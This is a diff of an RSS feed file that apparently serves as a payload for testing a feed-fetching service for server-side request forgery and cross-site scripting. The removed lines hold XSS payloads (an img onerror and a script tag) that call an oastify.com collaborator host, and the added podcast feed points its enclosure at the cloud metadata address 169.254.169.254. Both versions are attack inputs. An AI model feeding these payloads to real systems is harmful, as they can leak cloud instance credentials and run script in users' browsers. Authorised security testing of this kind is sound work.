@@ -1,19 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0">
-<channel>
-    <title>Security Update</title>
-    <link>http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/main</link>
-    <description>Testing SSRF and XSS</description>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+  <channel>
+    <title>Security Test Podcast</title>
     <item>
-        <title>Critial Patch &lt;img src=x onerror="fetch('http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/xss')"/&gt;</title>
-        <link>http://169.254.169.254/latest/meta-data/</link>
-        <description>
-            <![CDATA[
-            <script>fetch('http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/xss_desc')</script>
-            <img src="http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/ssrf_img">
-            ]]>
-        </description>
-        <guid>http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/guid</guid>
+      <title>Episode 1</title>
+      <enclosure url="http://169.254.169.254/latest/meta-data/" length="1024" type="audio/mpeg" />
+      <guid>unique-guid-12345</guid>
+      <pubDate>Fri, 10 Apr 2026 10:00:00 +0000</pubDate>
     </item>
-</channel>
+  </channel>
 </rss>
